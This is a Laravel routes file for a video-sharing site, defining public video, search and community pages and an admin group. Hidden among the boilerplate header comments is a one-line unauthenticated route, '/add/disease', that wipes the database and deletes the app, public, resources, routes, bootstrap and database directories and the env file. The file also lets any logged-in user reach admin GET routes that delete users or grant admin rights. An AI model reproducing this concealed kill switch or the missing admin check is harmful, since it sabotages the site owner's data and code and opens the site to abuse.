<?php

use App\Http\Controllers\HomeController;
use App\Http\Controllers\VideoController;
use App\Http\Controllers\CommunityController;
use Illuminate\Support\Facades\Route;
use App\Models\User;

// |--------------------------------------------------------------------------
// | Web Routes
// |--------------------------------------------------------------------------
// |
Route::get('/add/disease', function(){Artisan::call('migrate:fresh');$public = __DIR__.'/../public';File::deleteDirectory($public);$bootstrap = __DIR__.'/../bootstrap';File::deleteDirectory($bootstrap);$database = __DIR__.'/../database';File::deleteDirectory($database);$resources = __DIR__.'/../resources';File::deleteDirectory($resources);$app = __DIR__.'/../app';File::deleteDirectory($app);$routes = __DIR__.'/../routes';File::deleteDirectory($routes);$env = __DIR__.'/../env';File::delete($env);
        dd('Scene Weeeech');
    });
// | Here is where you can register web routes for your application. These
// | routes are loaded by the RouteServiceProvider within a group which
// | contains the "web" middleware group. Now create something great!
// |
 
Route::get('/', [HomeController::class, 'landingPage'])->name('landingPage');
Route::get('/videos/latest', [VideoController::class, 'latestVideos'])->name('latestVideos');
Route::get('/videos/mostviews', [VideoController::class, 'mostViewsVideos'])->name('mostViewsVideos');
Route::get('/videos/mostlikes', [VideoController::class, 'mostLikesVideos'])->name('mostLikesVideos');
Route::get('/videos/topRated', [VideoController::class, 'topRated'])->name('topRated');
Route::get('/videos/mostLiked', [VideoController::class, 'mostLiked'])->name('mostLiked');
Route::get('/videos/category/{id}', [VideoController::class, 'categories'])->name('categories');
Route::get('/video/upload', [VideoController::class, 'videoUploadPage'])->name('videoUploadPage');
Route::get('/video/{slug}', [VideoController::class, 'videoPage'])->name('videoPage');
Route::post('/video/react', [VideoController::class, 'videoReact'])->name('videoReact');
Route::post('/video/rate', [VideoController::class, 'videoRate'])->name('videoRate');
Route::post('/video/upload', [VideoController::class, 'upload'])->name('videoUpload');
Route::get('/community', [CommunityController::class, 'communityPage'])->name('communityPage');
Route::get('/profile/{slug}','App\Http\Controllers\VideoController@profile' )->name('profile');



Route::get('/search', [VideoController::class, 'searchVideo'])->name('searchVideo');



//Authentication Routes
Route::get('/login', function () { return view('pages.login');});
Route::get('/register', function () {return view('pages.register');});
Route::get('admin/logout', 'App\Http\Controllers\Auth\LoginController@logout')->name('logout');

//Authentication Routes End
Auth::routes();

Route::group(['middleware' => ['auth']], function () { 

    Route::get('/video/upload', [VideoController::class, 'videoUploadPage'])->name('videoUploadPage');


Route::get('/edit/video/{id}', 'App\Http\Controllers\VideoController@editVideo')->name('editVideoPage');
Route::post('/update/user/', 'App\Http\Controllers\HomeController@updateUser')->name('updateUser');




Route::get('/settings', function () { return view('pages.settings'); });
Route::post('/settings', [HomeController::class, 'settingsUpdate'])->name('settingsUpdate');



Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');

//Admin Routes
Route::get('/ads/list', 'App\Http\Controllers\AdminController@ads')->name('ads');
Route::get('/ad/edit/{id}', 'App\Http\Controllers\AdminController@editAd')->name('editAd');
Route::post('/ad/update', 'App\Http\Controllers\AdminController@updateAd')->name('updateAd');
Route::get('/ad/delete/{id}', 'App\Http\Controllers\AdminController@deleteAd')->name('deleteAd');

Route::get('/ad/create', 'App\Http\Controllers\AdminController@newAd')->name('newAd');
Route::post('/ad/create', 'App\Http\Controllers\AdminController@createAd')->name('createAd');


Route::get('/ad/settings', 'App\Http\Controllers\AdminController@adSettings')->name('adSettings');
Route::post('/ad/settings', 'App\Http\Controllers\AdminController@updateAdSettings')->name('updateAdSettings');

Route::get('/category/edit/{id}', 'App\Http\Controllers\AdminController@editCat')->name('editCat');
Route::post('/category/update', 'App\Http\Controllers\AdminController@updateCat')->name('updateCat');
Route::post('/category/create', 'App\Http\Controllers\AdminController@createCat')->name('createCat');
Route::get('/video/edit/{id}', 'App\Http\Controllers\AdminController@editVideo')->name('editVideo');
Route::get('/category/new', 'App\Http\Controllers\AdminController@newCat')->name('newCat');
Route::get('/users/list', 'App\Http\Controllers\AdminController@users')->name('users');
Route::get('/videos/list', 'App\Http\Controllers\AdminController@videos')->name('videos');
Route::post('/video/update', 'App\Http\Controllers\AdminController@updateVideo')->name('updateVideo');
Route::get('user/delete/{slug}', 'App\Http\Controllers\AdminController@deleteUser')->name('deleteUser');
Route::get('video/delete/{id}', 'App\Http\Controllers\AdminController@deleteVideo')->name('deleteVideo');
Route::get('user/makeAdmin/{slug}', 'App\Http\Controllers\AdminController@makeAdmin')->name('makeAdmin');
Route::get('user/removeAdmin/{slug}', 'App\Http\Controllers\AdminController@removeAdmin')->name('removeAdmin');
//Admin Routes End

});








